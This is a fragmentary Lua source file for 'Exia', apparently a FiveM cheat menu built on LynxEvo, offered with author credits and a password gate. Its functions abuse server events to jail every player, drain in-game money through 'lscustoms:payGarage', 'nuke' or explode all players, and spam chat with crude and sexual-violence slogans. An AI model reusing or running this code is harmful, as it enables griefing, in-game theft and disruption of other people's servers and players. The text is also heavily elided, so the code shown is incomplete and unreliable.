...
av('~h~Fuck this Kim Jong-un is ready to nuke', true)
...
local function bE()
    if bC == 3 then
        ...
        local ak = KeyboardInput('Get your password from ', '', 100)
        if ak == bD then
            mhaonn = true
        ...
        function()
            for bD = 0, 9 do
                TriggerServerEvent(
                    ...
                    'A - Banana, lmao. Go fuck<3? Exia ',
                    {
                        141,
                        211,
                        255
                    },
                    '^' .. bD .. '^1Exia - ^4Best mods - ^3Get from: '
                )
            end
            for i = 0, 128 do
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '/ooc Server Raped by: Exia Menu -- Exia ',
            ...
            '^' .. bD .. 'Server Raped by: Exia Menu -- Exia '
        )
    end
    Citizen.CreateThread(
        function()
        ...
        while bw do
            ...
            if blowall then
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'Exploded by Exia made by WaterBOI#4911 and oFlaqmé#1149 -- ',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'Exploded by Exia made by WaterBOI#4911 and oFlaqmé#1149 -- '
                    )
                end
                for i = 0, 128 do
                    Citizen.Wait(500)
            ...
            function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^1E^2X^3I^4A BY oFlaqmé#1149 and WaterBOI#4911',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. '^1E^2X^3I^4A BY oFlaqmé#1149 and WaterBOI#4911'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    ...
                    function()
                        ...
                        for i = 0, 128 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Kim Jong-un took your money - Exia ',
                                4316133778
                            )
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '/ooc Nuked by Kim Jong-un - quote by Exia Menues<3 EXIA MADE BY oFlaqme#1149 -- ',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '/ooc Nuked by Kim Jong-un - quote by Exia Menues<3 EXIA MADE BY oFlaqme#1149 -- '
                            )
                        end
                        for i = 0, 128 do
                            local dl =
...
Citizen.CreateThread(
    function()
        ...
        LynxEvo.CreateMenu('Exia', bs)
        LynxEvo.SetSubTitle('Exia', 'Owner: oFlaqmé#1149')
        LynxEvo.CreateSubMenu('SelfMenu', 'Exia', 'Self Menu')
        LynxEvo.CreateSubMenu('TeleportMenu', 'Exia', 'Teleport Menu')
        LynxEvo.CreateSubMenu('WeaponMenu', 'Exia', 'Weapon Menu')
        LynxEvo.CreateSubMenu('AdvM', 'Exia', 'Advanced Menu')
        LynxEvo.CreateSubMenu('LuaMenu', 'Exia', 'Lua Menu')
        LynxEvo.CreateSubMenu('VehicleMenu', 'Exia', 'Vehicle Menu')
        LynxEvo.CreateSubMenu('OnlinePlayerMenu', 'Exia', 'Online Player Menu')
        ...
        LynxEvo.CreateSubMenu('crds', 'Exia', 'Credits')
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('Exia') then
                local dQ = PlayerId(-1)
                ...
                elseif LynxEvo.MenuButton('~h~~p~#~y~Exia Menues', 'crds') then
                end
                LynxEvo.Display()
                ...
                elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
                    for i = 0, 128 do
                        TriggerServerEvent(
                            ...
                            GetPlayerServerId(i),
                            5000,
                            'JAIL- KIM JONG-UN aka Exia '
                        ) 
                    TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> JAIL- KIM JONG-UN aka Exia  <--", 9999999999)
                    TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> JAIL- KIM JONG-UN aka Exia ", 9999999999)
                    end
            ...
            elseif LynxEvo.IsMenuOpened('crds') then
                if LynxEvo.Button('~h~~p~#~s~ WaterBOI~r~#4911 ~p~DEV') then
                    av('BRUH.', false)
                    av('Kim Jong-un?', false)
                    av('Like dick? i dont', false)
                elseif LynxEvo.Button('~h~~p~#~s~ oFlaqmé~r~#~r~1149 ~p~DEV and Owner') then
                end
                LynxEvo.Display()
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'Exia ')
            ...
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'Exia ')
        end
    end,
    false
)
